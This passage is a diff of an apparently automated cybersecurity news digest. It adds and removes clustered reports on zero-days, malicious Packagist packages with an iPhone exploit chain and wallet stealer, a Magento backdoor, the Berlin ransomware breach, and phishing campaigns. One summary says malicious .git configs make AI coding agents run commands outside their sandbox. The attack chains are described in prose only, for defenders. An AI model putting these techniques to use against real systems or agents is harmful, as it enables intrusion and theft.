Million Driver License Images Offered on Dark Web Latest News N-able Patches Critical Zero-Day in N-central Nightmare Eclipse Drops CrowdStrike, Nvidia, Avast Zero-Day Exploits North Korean Hackers Deploy New Linux Espionage Toolkit OpenAI Agents Hijack Another Victim Website Adobe Commerce Zero-Day Exploited to Backdoor Online Stores Modified ScreenConnect Clients Used in Worm-Like Campaign Elementor Pro WordPress Plugin Vulnerability Exploited to Hack Sites In Other News: Microsoft’s Cloud Patches, Hacked Dropbox Account
+```
+
+#### Corroborating sources (1)
+
+- **SecurityWeek** (cyber_news_breach_reporting)
+  - Title: Mathspace Data Breach Exposes Over 1 Million People
+  - Published: 2026-09-08T10:47:36+00:00
+  - Link: https://www.securityweek.com/mathspace-data-breach-exposes-over-1-million-people/
+  - Summary: Hackers stole the information of students, teachers, staff, and parents/guardians from a self-hosted Metabase instance. The post Mathspace Data Breach Exposes Over 1 Million People appeared first on SecurityWeek .
+
+### Cluster 8d0dc94b54 — score 10
+
+- Title: N-able Patches Critical Zero-Day in N-central
+- Source: SecurityWeek (cyber_news_breach_reporting)
+- Published: 2026-09-08T10:37:58+00:00
+- Link: https://www.securityweek.com/n-able-patches-critical-zero-day-in-n-central/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: active_exploitation, apt_espionage, data_breach, web_shell_backdoor, zero_day
+- affected_products: OpenAI/ChatGPT, VMware, WordPress
+- cve_ids: CVE-2026-86206, CVE-2026-86207, CVE-2026-86218
+- urgency_signals: actively_exploited, no_patch_yet, preauth_unauth, zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: zero_day, data_breach, apt_espionage, web_shell_backdoor, active_exploitation
+- affected_products: VMware, OpenAI/ChatGPT, WordPress
+- cve_ids: CVE-2026-86218, CVE-2026-86206, CVE-2026-86207
+- urgency_signals: actively_exploited, zero_day, preauth_unauth, no_patch_yet
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Administrators are advised to check their deployments for newly created user accounts they don’t recognize. The post N-able Patches Critical Zero-Day in N-central appeared first on SecurityWeek .
+```
+
+#### Full body
+
+```
+IT software firm N-able has rolled out an urgent fix for an unauthenticated remote code execution (RCE) vulnerability in its N-central endpoint management platform that has been exploited as a zero-day. Tracked as CVE-2026-86218 (CVSS score of 10/10), the security defect was discovered after N-able patched two other flaws in N-central, namely CVE-2026-86206 and CVE-2026-86207 “This critical zero-day vulnerability, CVE-2026-86218, could allow pre-authenticated access to the N-central server if exploited,” N-able warns . While no action is required for N-central hosted environments, as the patches were deployed server-side, users of on-premises N-central instances should immediately apply the 2026.3 HF4 hotfix , the company says. “Review your logs for scanning activity. We’ve observed scans originating from the IP range 23.234.64.0/18 attempting to exploit this vulnerability. Check your logs for any connections from this range,” N-able also notes. Administrators are also advised to check their deployments for newly created user accounts they don’t recognize. Advertisement. Scroll to continue reading. “At this time, we have no confirmations that this vulnerability has been exploited in production environments, but unpatched systems remain at risk,” N-able says. The hotfix for the exploited zero-day supersedes the previously released patches for CVE-2026-86206 and CVE-2026-86207, two bugs that Huntress flagged as potentially chained together in the wild to bypass authentication and compromise N-central production environments. “However, due to limited historical logging available directly on the appliance, we cannot definitively confirm which specific exploit the threat actor used to achieve their compromise, nor can we rule out the use of alternative vulnerabilities,” Huntress said on Saturday. The cybersecurity firm observed attacks targeting N-central’s underlying API and appliance logs starting on September 4, 2026. Related: Nightmare Eclipse Drops CrowdStrike, Nvidia, Avast Zero-Day Exploits Related: Adobe Commerce Zero-Day Exploited to Backdoor Online Stores Related: Modified ScreenConnect Clients Used in Worm-Like Campaign Related: Elementor Pro WordPress Plugin Vulnerability Exploited to Hack Sites Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire HPE Patches Critical RCE Vulnerabilities in AOS-CX Sangoma Switchvox Vulnerabilities Exploited in the Wild 12-Year-Old PostgreSQL Vulnerability Enables Database, Server Takeover VMware Workstation and Fusion Updates Patch Critical Vulnerability Google Patches 6th Chrome Zero-Day of 2026 Manchester Airports Group Data on 8.8 Million People Leaked After Ransom Refusal HiddenLayer Raises $100 Million for AI Runtime Security 153 Million Driver License Images Offered on Dark Web Latest News Mathspace Data Breach Exposes Over 1 Million People Nightmare Eclipse Drops CrowdStrike, Nvidia, Avast Zero-Day Exploits North Korean Hackers Deploy New Linux Espionage Toolkit OpenAI Agents Hijack Another Victim Website Adobe Commerce Zero-Day Exploited to Backdoor Online Stores Modified ScreenConnect Clients Used in Worm-Like Campaign Elementor Pro WordPress Plugin Vulnerability Exploited to Hack Sites In Other News: Microsoft’s Cloud Patches, Hacked Dropbox Accounts, Guardio’s $1.1B Valuation Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Virtual Event: Attack Surface Management Summit 2026 September 16, 2026 Join as speakers examine the various components of ASM strategy, the push to mandate continuous asset visibility and inventory tools, and the use of red-teaming, bug bounties and pen-tests in modern security programs. Register Webinar: Minimum
+```
+
+#### Corroborating sources (1)
+
+- **SecurityWeek** (cyber_news_breach_reporting)
+  - Title: N-able Patches Critical Zero-Day in N-central
+  - Published: 2026-09-08T10:37:58+00:00
+  - Link: https://www.securityweek.com/n-able-patches-critical-zero-day-in-n-central/
+  - Summary: Administrators are advised to check their deployments for newly created user accounts they don’t recognize. The post N-able Patches Critical Zero-Day in N-central appeared first on SecurityWeek .
 
 ### Cluster b04cf6724c — score 10
 
@@ -3427,53 +3522,6 @@ Malicious .git Configs Can Make Claude, Codex, Cursor, and Other AI Agents Run A
   - Link: https://thehackernews.com/2026/09/malicious-git-configs-can-make-claude.html
   - Summary: Manifold Security has disclosed eight security flaws across seven command-line AI coding agents in which a repository's own Git configuration names a command that the agent runs on the developer's machine, four of them still unpatched at publication. The command executes as the user, outside the agent's sandbox and without an approval prompt, and exploitation requires the repository to arrive
 
-### Cluster c0456846cc — score 10
-
-- Title: 13 Malicious Packagist Packages Target Unpatched iPhones to Steal Crypto Wallet Seeds
-- Source: The Hacker News (cyber_news_breach_reporting)
-- Published: 2026-09-01T14:07:20+00:00
-- Link: https://thehackernews.com/2026/09/13-malicious-packagist-packages-target.html
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: Packagist
-
-#### Cluster taxonomy (union across members)
-- affected_industries: financial_services
-- affected_products: Apple iOS/macOS, Packagist
-- cve_ids: CVE-2025-31277, CVE-2025-43398, CVE-2025-43510, CVE-2025-43520, CVE-2025-43529
-- urgency_signals: no_patch_yet
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- affected_industries: financial_services
-- affected_products: Packagist, Apple iOS/macOS
-- cve_ids: CVE-2025-31277, CVE-2025-43529, CVE-2025-43398, CVE-2025-43510, CVE-2025-43520
-- urgency_signals: no_patch_yet
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Cybersecurity researchers have identified a set of 13 malicious Composer theme packages on Packagist that are designed to inject JavaScript into Vietnamese movie and comic streaming sites that install those libraries and initiate the deployment of spyware aimed at unpatched iOS devices. "The injected code runs two operations against a site's visitors: a mobile ad-fraud and gambling-redirect
-```
-
-#### Full body
-
-```
-13 Malicious Packagist Packages Target Unpatched iPhones to Steal Crypto Wallet Seeds  Ravie Lakshmanan  Sep 01, 2026 Malware / Web Security Cybersecurity researchers have identified a set of 13 malicious Composer theme packages on Packagist that are designed to inject JavaScript into Vietnamese movie and comic streaming sites that install those libraries and initiate the deployment of spyware aimed at unpatched iOS devices. "The injected code runs two operations against a site's visitors: a mobile ad-fraud and gambling-redirect chain, and, on iPhones, a WebKit-to-kernel exploit chain that installs spyware," Socket security researcher Kush Pandya said . The activity is assessed to be part of a campaign that was first documented by the application security company back in March 2026 that leveraged six malicious Packagist packages posing as OphimCMS themes to redirect visitors, exfiltrate URLs, inject ads, and serve from Funnull -hosted infrastructure a second-stage payload to lead victims to gambling and adult content sites. The complete set of packages, which span five vendor namespaces, is below - vsmov: theme-dy, theme-rrdyw, theme-motchill, theme-vsmov vsphim: theme-heovl, theme-thempho haiau009: kkphim-legend, kkphim-motchill chilltvcms: theme-legend ophimcms: theme-dy, theme-motchill, theme-pcc, theme-rrdyw At a high level, the trojanized Composer theme injects JavaScript that runs a mobile gambling and ad-fraud redirect and, on iPhones, a Funnull-hosted WebKit-to-kernel exploit chain ending in spyware and cryptocurrency-wallet theft. The iOS attack chain is designed to insert a hidden iframe element that determines the iOS version and loads an operating system-specific version of the exploit. Specifically, it weaponizes two WebKit vulnerabilities -- CVE-2025-31277 (Patched in version 18.6) and CVE-2025-43529 (Patched in versions 18.7.3 and 26.2) -- in a manner that's analogous to the DarkSword exploit kit. The payload then pivots out of the WebContent sandbox into the GPU process, followed by a second stage that reaches the kernel through the AppleM2ScalerCSCDriver IOKit user client and ultimately obtains read and write privileges. Apple is said to have addressed the kernel escape flaw in iOS and macOS 26.1 . Pandya told The Hacker News that Apple did not share a CVE identifier for the kernel escape vulnerability, but that the iPhone maker confirmed the issue had already been patched in iOS 26.1 and macOS 26.1 before receiving their report. It's suspected to be CVE-2025-43398 , CVE-2025-43510 , or CVE-2025-43520 , all of which were kernel-related bugs fixed late last year. "On success, the final payload uses the kernel read to collect keychain databases, Wi-Fi passwords, the SMS database, the address book, Photos, browser cookies, call history, location history, and account databases, encrypts them with AES, and uploads them over HTTPS POST /upload to a rotating pool of command and control domains," Pandya explained. "The worker beacons exploitation progress to cloudfareintcdn[.]com/wd-status.html." The threat actors behind the campaign have been found to redeploy the whole iOS chain around August 12, 2026, mainly targeting iOS devices running versions 18.4 through 18.6.x with a new payload that adds an iOS Keychain cryptocurrency wallet seed and mnemonic stealer. The malware queries the password store for wallet material from Bitget, BitKeep, Bitpie, Phantom, Tonkeeper, Trust Wallet, and OKX, extending beyond device data collection to direct financial theft. Socket said the same five vendor namespaces have published additional theme packages that carry no active payload at the time of analysis, although they have been configured such that the malicious code could be activated via "Custom JS" fields rendered into every page on the websites. It's not clear who is behind the campaign, although it's believed to be the work of a Vietnamese-operated group based on commit metadata timestamps. It's worth pointing out that the
-```
-
-#### Corroborating sources (1)
-
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: 13 Malicious Packagist Packages Target Unpatched iPhones to Steal Crypto Wallet Seeds
-  - Published: 2026-09-01T14:07:20+00:00
-  - Link: https://thehackernews.com/2026/09/13-malicious-packagist-packages-target.html
-  - Summary: Cybersecurity researchers have identified a set of 13 malicious Composer theme packages on Packagist that are designed to inject JavaScript into Vietnamese movie and comic streaming sites that install those libraries and initiate the deployment of spyware aimed at unpatched iOS devices. "The injected code runs two operations against a site's visitors: a mobile ad-fraud and gambling-redirect
-
 ### Cluster a91efa5346 — score 9
 
 - Title: Guildma (Astaroth) malware infection from Brazilian Portuguese email, (Tue, Sep 1st)
@@ -3507,73 +3555,26 @@ Introduction
   - Link: https://isc.sans.edu/diary/rss/33300
   - Summary: Introduction
 
-### Cluster 3e2126d697 — score 9
-
-- Title: Berlin investigates new data leak after hackers publish stolen login credentials
-- Source: The Record (cyber_news_breach_reporting)
-- Published: 2026-09-07T11:50:00+00:00
-- Link: https://therecord.media/germany-berlin-second-data-breach-city-agencies
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: data_breach, ransomware_extortion
-- actor_attribution: Rhysida
-- affected_industries: financial_services, government
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, data_breach
-- actor_attribution: Rhysida
-- affected_industries: financial_services, government
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Another trove of data from Berlin's government has appeared online, authorities said. Germany's information security agency separately warned about the Rhysida cybercrime group.
-```
-
-#### Full body
-
-```
-Berlin. Image: Ro Berto via Pexels Berlin investigates new data leak after hackers publish stolen login credentials German authorities are investigating another trove of data stolen from Berlin’s government network after hackers published login credentials and other information over the weekend. The latest release follows a cyberattack discovered in mid-August that compromised two Berlin ministries responsible for urban development and housing, and for transport, mobility, climate protection and the environment. Berlin’s government said Sunday that the newly released data includes login credentials but did not say what systems they could be used to access or whether they were still valid. The authorities have not attributed the attack to a specific threat actor. The city’s urban development ministry has strengthened security measures introduced after an earlier data leak, which officials said could temporarily limit access to some of its applications. 'A very serious crime' Berlin’s data protection authority said Friday that the attackers stole a large amount of data from the two affected ministries and later published it online. Officials are still reviewing the stolen files because of the volume of data involved. The regulator confirmed that the leak includes personal information about public employees and said data belonging to Berlin residents also may have been exposed. Potentially compromised information includes names, addresses, dates of birth, bank information, email addresses, telephone numbers, correspondence with government agencies and copies of documents submitted to the administration, according to the regulator. Berlin has created an additional task force to review the leaked material and determine who may be affected. “A very serious crime has been committed against the State of Berlin,” Governing Mayor Kai Wegner said Saturday, adding that authorities were working to identify and assist people whose information had been exposed. No payment The Rhysida ransomware group claimed responsibility for the breach in late August, saying it had stolen 5.79 terabytes of data, including tens of thousands of contracts, emails, passwords and classified information. Berlin has confirmed that data was stolen and that it received an extortion demand, but officials have not publicly attributed the attack to Rhysida or verified the hackers’ claims about the amount or contents of the stolen material. Wegner said last month that Berlin would not pay the attackers. “The State of Berlin will not be blackmailed,” Berlin Chief Digital Officer Florian Hauer said separately. The affected systems were disconnected from Berlin’s wider government network on Aug. 14. Both ministries continued operating, but the disruption left some employees without their normal email and internet access and temporarily affected public services that depend on their systems. Rhysida warning Germany’s Federal Office for Information Security, or BSI, separately warned Friday about a cyberattack campaign linked to the same financially motivated hackers behind Rhysida. The agency did not explicitly identify Berlin as one of the victims but said it had been informed in August about the compromise of a government institution. According to the BSI, the campaign resembles the so-called TerminalFix attacks recently documented by Microsoft. Hackers compromise websites and display fake CAPTCHA verification pages that trick visitors into manually running malicious commands on their computers. The BSI said reports it received indicated that attackers attempted both to steal data and install ransomware, allowing them to pressure victims with the threat of publishing stolen information. The agency said the campaign involved malware known as LoremIpsumLoader, or AxolotLoader, which it linked to the same financially motivated cybercriminal group associated with Rhysida. “According to current findings, the campaign is being carried out by cybercriminal actors,” the BSI said.
-```
-
-#### Corroborating sources (1)
-
-- **The Record** (cyber_news_breach_reporting)
-  - Title: Berlin investigates new data leak after hackers publish stolen login credentials
-  - Published: 2026-09-07T11:50:00+00:00
-  - Link: https://therecord.media/germany-berlin-second-data-breach-city-agencies
-  - Summary: Another trove of data from Berlin's government has appeared online, authorities said. Germany's information security agency separately warned about the Rhysida cybercrime group.
-
 ### Cluster 90c34aa7f8 — score 9
 
 - Title: Magento StyleSmuggler zero-day exploited to deploy Linux backdoor
 - Source: BleepingComputer (cyber_news_breach_reporting)
 - Published: 2026-09-07T16:50:29+00:00
 - Link: https://www.bleepingcomputer.com/news/security/magento-stylesmuggler-zero-day-exploited-to-deploy-linux-backdoor/
-- Fetch status: ok
+- Fetch status: fetch_failed:HTTPError
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, web_shell_backdoor, zero_day
-- affected_industries: retail_ecommerce
-- urgency_signals: actively_exploited, emergency_patch, zero_day
+- threat_categories: web_shell_backdoor, zero_day
+- urgency_signals: zero_day
 - content_type: news_report
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: zero_day, web_shell_backdoor, active_exploitation
-- affected_industries: retail_ecommerce
-- urgency_signals: actively_exploited, zero_day, emergency_patch
+- threat_categories: zero_day, web_shell_backdoor
+- urgency_signals: zero_day
 - content_type: news_report
 - confidence_tier: tier_4_news
 
@@ -3581,12 +3582,6 @@ Berlin. Image: Ro Berto via Pexels Berlin investigates new data leak after hacke
 
 ```
 A zero-day vulnerability dubbed "StyleSmuggler" affecting all versions of Magento and Adobe Commerce is being exploited in attacks to deploy a backdoor. [...]
-```
-
-#### Full body
-
-```
-Magento StyleSmuggler zero-day exploited to deploy Linux backdoor By Bill Toulas September 7, 2026 12:50 PM 0 A zero-day vulnerability dubbed “StyleSmuggler” affecting all versions of Magento and Adobe Commerce is being exploited in attacks to deploy a backdoor. The first exploitation incident was recorded on September 4 on a target running the latest security updates. E-commerce security company Sansec says that Adobe Enterprise Support confirmed earlier today that it was working on a fix but did not provide a timeline for its release. Magento is a popular open-source e-commerce platform by Adobe installed on more than 160,000 websites, including 14,000 of the top 1 million sites. Linux backdoor The exploit Sansec observed in the wild abuses Magento’s template system through PHP code injection to generate a fake “failed-payment” email, which triggers code execution. Successful exploitation installs a small Rust-based backdoor as a background process, disguised as [kworker/u:8:0]. Newer versions disguise the process as fc-cache and copy it to ~/.cache/fontconfig/fc-cache. According to Sansec researchers, the attacker also adds a cron job configured to repeat every 30 minutes for persistence. Although Sansec did not observe any follow-on activity, the malware can communicate with remote infrastructure and receive commands. The researchers note that earlier samples of the backdoor used TLS/WebSockets to communicate with the command-and-control (C2) address, while newer versions disguise their traffic as Network Time Protocol (NTP). They send UDP packets to port 123 and use hostnames that resemble time-syncing infrastructure, helping to mask malicious traffic as NTP and get through firewalls. The malware also determines the server's public IP using services including ipify, icanhazip, ident.me, and ipinfo.io, and checks Linux's TracerPid value to detect tracing. If tracing is active, the malware still installs, but does not beacon. Sansec says an unexpected surge of Magento "Payment Transaction Failed Reminder" emails may indicate exploitation, and also recommends monitoring for ‘kworker’ or ‘fc-cache’ processes, suspicious cron entries, and temporary files. If there is suspicion of compromise, it is recommended to rotate Magento credentials. At the time of writing, Adobe has not released fixes for StyleSmuggler, but the firm’s next scheduled security release is tomorrow, September 8. Until fixes are made available, Sansec recommends that website administrators disable GraphQL as a mitigation measure. BleepingComputer has contacted Adobe to ask if a fix for StyleSmuggler is planned for rollout tomorrow, but the company has not yet responded. Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: Hackers exploit critical Adobe Commerce flaw to hijack customer accounts PaperCut releases second emergency patch for exploited flaws PaperCut warns of NG, MF flaw exploited in zero-day attacks Arista patches VeloCloud Orchestrator zero-day exploited in attacks Check Point warns of SmartConsole zero-day exploited in attacks
 ```
 
 #### Corroborating sources (1)
@@ -3790,6 +3785,43 @@ Nearly two dozen issues, tracked collectively as CVE-2026-73749 (CVSS score of 9
   - Link: https://www.securityweek.com/hpe-patches-critical-rce-vulnerabilities-in-aos-cx/
   - Summary: Nearly two dozen issues, tracked collectively as CVE-2026-73749 (CVSS score of 9.8), were addressed with the updates. The post HPE Patches Critical RCE Vulnerabilities in AOS-CX appeared first on SecurityWeek .
 
+### Cluster 3e2126d697 — score 9
+
+- Title: Berlin investigates new data leak after hackers publish stolen login credentials
+- Source: The Record (cyber_news_breach_reporting)
+- Published: 2026-09-07T11:50:00+00:00
+- Link: https://therecord.media/germany-berlin-second-data-breach-city-agencies
+- Fetch status: not_attempted
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: data_breach
+- affected_industries: government
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: data_breach
+- affected_industries: government
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Another trove of data from Berlin's government has appeared online, authorities said. Germany's information security agency separately warned about the Rhysida cybercrime group.
+```
+
+#### Corroborating sources (1)
+
+- **The Record** (cyber_news_breach_reporting)
+  - Title: Berlin investigates new data leak after hackers publish stolen login credentials
+  - Published: 2026-09-07T11:50:00+00:00
+  - Link: https://therecord.media/germany-berlin-second-data-breach-city-agencies
+  - Summary: Another trove of data from Berlin's government has appeared online, authorities said. Germany's information security agency separately warned about the Rhysida cybercrime group.
+
 ### Cluster 36383a6cd0 — score 9
 
 - Title: Security Vulnerability in a Voting System
@@ -3823,75 +3855,42 @@ It’s a vulnerability that allows someone to recover the order of ballots cast,
   - Link: https://www.schneier.com/blog/archives/2026/09/security-vulnerability-in-a-voting-system.html
   - Summary: It’s a vulnerability that allows someone to recover the order of ballots cast, newly exploited with AI tools. Nearly four years since the original vulnerability was disclosed, I was still able to use it to analyze voter behavior in Georgia (one of the 21 states that uses affected scanners) in the recent May 2026 primary. Notably, I never touched a voting machine, exploited a network, examined source code, or accessed anything non-public. After pointing a coding agent to the original vulnerability paper, I supplied it with two data sources highlighted in the paper: the early-voting list for each county, and the “CVR” (cast-vote record) file, containing every ballot and its selections (but not the voters’ names or other identifying information). The CVR file is available upon request, precisely because a public, ballot-level record is what makes election results independently verifiable...
 
-### Cluster 3754befed2 — score 9
+### Cluster 3fd4e6074e — score 9
 
-- Title: Leaked Russian Cyber-Operations Training Materials
-- Source: Schneier on Security (practitioner_analysis)
-- Published: 2026-09-01T16:29:10+00:00
-- Link: https://www.schneier.com/blog/archives/2026/09/leaked-russian-cyber-operations-training-materials.html
-- Fetch status: not_attempted
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: incident_report
-- confidence_tier: tier_3_analysis
-
-#### Primary article taxonomy
-- content_type: incident_report
-- confidence_tier: tier_3_analysis
-
-#### Summary
-
-```
-This is interesting: The records describe a force-generation mechanism for several General Staff components, including the GRU, Main Operational Directorate, and 8th Directorate, which is associated with protected communications, cryptography, and information security. […] The reporting also linked a 2024 Department No. 4 graduate, Aleksei Kondrashov, to Military Unit 74455, widely known as Sandworm. That unit has been associated with destructive cyber activity against Ukraine and other targets, including the 2017 NotPetya attack. The reports do not establish that every listed graduate participated in a named operation; assignments should therefore be described as reported unit placements, not proof of individual operational involvement...
-```
-
-#### Corroborating sources (1)
-
-- **Schneier on Security** (practitioner_analysis)
-  - Title: Leaked Russian Cyber-Operations Training Materials
-  - Published: 2026-09-01T16:29:10+00:00
-  - Link: https://www.schneier.com/blog/archives/2026/09/leaked-russian-cyber-operations-training-materials.html
-  - Summary: This is interesting: The records describe a force-generation mechanism for several General Staff components, including the GRU, Main Operational Directorate, and 8th Directorate, which is associated with protected communications, cryptography, and information security. […] The reporting also linked a 2024 Department No. 4 graduate, Aleksei Kondrashov, to Military Unit 74455, widely known as Sandworm. That unit has been associated with destructive cyber activity against Ukraine and other targets, including the 2017 NotPetya attack. The reports do not establish that every listed graduate participated in a named operation; assignments should therefore be described as reported unit placements, not proof of individual operational involvement...
-
-### Cluster 817be3097f — score 9
-
-- Title: Researcher Publishes CrowdStrike Privilege Escalation Zero Day
+- Title: Trezor Supply Chain Breach Now Impacts 81,000 Customers
 - Source: Infosecurity Magazine (cyber_news_breach_reporting)
-- Published: 2026-09-07T08:28:00+00:00
-- Link: https://www.infosecurity-magazine.com/news/crowdstrike-privilege-escalation/
+- Published: 2026-09-08T09:08:00+00:00
+- Link: https://www.infosecurity-magazine.com/news/trezor-supply-chain-breach-impacts/
 - Fetch status: not_attempted
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: zero_day
-- urgency_signals: zero_day
+- threat_categories: data_breach, supply_chain
+- affected_industries: financial_services
 - content_type: news_report
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: zero_day
-- urgency_signals: zero_day
+- threat_categories: supply_chain, data_breach
+- affected_industries: financial_services
 - content_type: news_report
 - confidence_tier: tier_4_news
 
 #### Summary
 
 ```
-A security researcher has posted a zero-day exploit in CrowdStrike which could allow hackers to escalate privileges
+Crypto wallet-maker Trezor says a data breach at supplier ShipMonk is far worse than originally thought
 ```
 
 #### Corroborating sources (1)
 
 - **Infosecurity Magazine** (cyber_news_breach_reporting)
-  - Title: Researcher Publishes CrowdStrike Privilege Escalation Zero Day
-  - Published: 2026-09-07T08:28:00+00:00
-  - Link: https://www.infosecurity-magazine.com/news/crowdstrike-privilege-escalation/
-  - Summary: A security researcher has posted a zero-day exploit in CrowdStrike which could allow hackers to escalate privileges
+  - Title: Trezor Supply Chain Breach Now Impacts 81,000 Customers
+  - Published: 2026-09-08T09:08:00+00:00
+  - Link: https://www.infosecurity-magazine.com/news/trezor-supply-chain-breach-impacts/
+  - Summary: Crypto wallet-maker Trezor says a data breach at supplier ShipMonk is far worse than originally thought
 
 ### Cluster 94a219b713 — score 9
 
@@ -3900,8 +3899,8 @@ A security researcher has posted a zero-day exploit in CrowdStrike which could a
 - Published: 2026-09-07T15:51:56+00:00
 - Link: https://thehackernews.com/2026/09/microsoft-365-attackers-use-help-desk.html
 - Fetch status: not_attempted
-- Member count: 2
-- Corroborating source count: 2
+- Member count: 3
+- Corroborating source count: 3
 - Strong signals: Microsoft 365
 
 #### Cluster taxonomy (union across members)
@@ -3922,13 +3921,18 @@ A security researcher has posted a zero-day exploit in CrowdStrike which could a
 Threat hunters have disclosed details of a widespread data theft and extortion threat cluster that's targeting Microsoft 365 and other software-as-a-service (SaaS) offerings through information technology (IT) help desk vishing, adversary-in-the-middle (AitM) token theft, and residential-proxy sign-ins. The activity, which mainly singles out directors, vice presidents, and other executive staff
 ```
 
-#### Corroborating sources (2)
+#### Corroborating sources (3)
 
 - **The Hacker News** (cyber_news_breach_reporting)
   - Title: Fake IT Calls Target Executives in Microsoft 365 Data Theft and Extortion Attacks
   - Published: 2026-09-07T15:51:56+00:00
   - Link: https://thehackernews.com/2026/09/microsoft-365-attackers-use-help-desk.html
   - Summary: Threat hunters have disclosed details of a widespread data theft and extortion threat cluster that's targeting Microsoft 365 and other software-as-a-service (SaaS) offerings through information technology (IT) help desk vishing, adversary-in-the-middle (AitM) token theft, and residential-proxy sign-ins. The activity, which mainly singles out directors, vice presidents, and other executive staff
+- **Infosecurity Magazine** (cyber_news_breach_reporting)
+  - Title: BigBear 2 PhaaS Campaign Steals 5000+ Microsoft Credentials
+  - Published: 2026-09-08T09:45:00+00:00
+  - Link: https://www.infosecurity-magazine.com/news/bigbear-2-phaas-5000-microsoft/
+  - Summary: CloudSEK has uncovered BigBear 2.0, a new phishing-as-a-service operation targeting Microsoft 365
 - **BleepingComputer** (cyber_news_breach_reporting)
   - Title: BigBear Microsoft 365 phishing service bypassed MFA at 258 organizations
   - Published: 2026-09-07T15:39:51+00:00
@@ -4005,12 +4009,12 @@ Turning off email images should at least stop the pictures. This week, attackers
   - Link: https://www.sophos.com/en-us/blog/dissecting-a-php-web-server-rootkit
   - Summary: <p>Sophos X-Ops takes a deep dive into an insidious piece of malware</p> Categories: Threat Research Tags: rootkit, php, webshell
 
-### Cluster e07ea27122 — score 8
+### Cluster 5aa1b8fc43 — score 8
 
-- Title: N-able patches max severity N-central flaw amid ongoing attacks
-- Source: BleepingComputer (cyber_news_breach_reporting)
-- Published: 2026-09-07T06:17:41+00:00
-- Link: https://www.bleepingcomputer.com/news/security/n-able-patches-max-severity-n-central-flaw-amid-ongoing-attacks/
+- Title: Creepy crawlies
+- Source: Simon Willison (ai_security_agentic_risk)
+- Published: 2026-09-07T23:08:58+00:00
+- Link: https://simonwillison.net/2026/Sep/7/creepy-crawlies/
 - Fetch status: not_attempted
 - Member count: 1
 - Corroborating source count: 1
@@ -4018,25 +4022,25 @@ Turning off email images should at least stop the pictures. This week, attackers
 
 #### Cluster taxonomy (union across members)
 - content_type: news_report
-- confidence_tier: tier_4_news
+- confidence_tier: tier_2_operator
 
 #### Primary article taxonomy
 - content_type: news_report
-- confidence_tier: tier_4_news
+- confidence_tier: tier_2_operator
 
 #### Summary
 
 ```
-N-able has released an emergency hotfix for a maximum-severity remote code execution (RCE) flaw affecting its N-central remote monitoring and management (RMM) platform. [...]
+Creepy crawlies Konstantin Ryabitsev discusses how bad the "background radiation" of abusive crawlers has become from the perspective of git.kernel.org , the official Git repository for the Linux kernel: TL;DR: we spend more CPU cycles rendering commits for scrapers than we spend on all other kinds of legitimate access, including git clones. At any one time, across 5 geo-distributed nodes, there are 14 CPU cores doing nothing but rendering git commits as html. I worry about this a lot from the perspective of Datasette, which serves a huge number of crawlable web pages. Via Hacker News Tags: crawling , git , linux , datasette , ai-ethics
 ```
 
 #### Corroborating sources (1)
 
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: N-able patches max severity N-central flaw amid ongoing attacks
-  - Published: 2026-09-07T06:17:41+00:00
-  - Link: https://www.bleepingcomputer.com/news/security/n-able-patches-max-severity-n-central-flaw-amid-ongoing-attacks/
-  - Summary: N-able has released an emergency hotfix for a maximum-severity remote code execution (RCE) flaw affecting its N-central remote monitoring and management (RMM) platform. [...]
+- **Simon Willison** (ai_security_agentic_risk)
+  - Title: Creepy crawlies
+  - Published: 2026-09-07T23:08:58+00:00
+  - Link: https://simonwillison.net/2026/Sep/7/creepy-crawlies/
+  - Summary: Creepy crawlies Konstantin Ryabitsev discusses how bad the "background radiation" of abusive crawlers has become from the perspective of git.kernel.org , the official Git repository for the Linux kernel: TL;DR: we spend more CPU cycles rendering commits for scrapers than we spend on all other kinds of legitimate access, including git clones. At any one time, across 5 geo-distributed nodes, there are 14 CPU cores doing nothing but rendering git commits as html. I worry about this a lot from the perspective of Datasette, which serves a huge number of crawlable web pages. Via Hacker News Tags: crawling , git , linux , datasette , ai-ethics
 
 ### Cluster 435f3509dc — score 8
 
@@ -4073,39 +4077,6 @@ Multiple lawsuits have been filed against identity verification company IDScan a
   - Link: https://www.bleepingcomputer.com/news/security/idscan-sued-over-alleged-data-breach-affecting-153-million-drivers/
